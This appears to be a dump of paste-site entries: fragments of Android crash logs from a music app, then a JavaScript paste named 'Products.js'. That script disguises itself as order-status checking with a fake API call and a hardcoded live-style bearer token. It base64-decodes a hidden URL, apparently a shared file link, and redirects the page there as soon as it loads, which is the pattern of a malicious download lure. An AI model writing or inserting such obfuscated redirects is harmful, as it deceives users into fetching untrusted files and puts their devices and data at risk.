416"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":401,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]}"
KUtnYC1r,2025-04-10T18:10:16.401092,powerampache,PHP,Thursday 10th of April 2025 08:10:18 AM CDT,"1.01-79 (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.NullSessionException: Session is NULL
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.authToken(BaseAmpacheRepository.kt:87)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$authToken$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:942)
	at android.os.Handler.dispatchMessage(Handler.java:99)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.app.ActivityThread.main(ActivityThread.java:7983)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:548)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:860)

scrobble() - generic exception {""detailMessage"":""Session is NULL"",""stackTrace"":[],""suppressedExceptions"":[]}"
5fRQpYwQ,Products.js,iLoveToWatch,JavaScript,Thursday 10th of April 2025 08:01:06 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55110/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
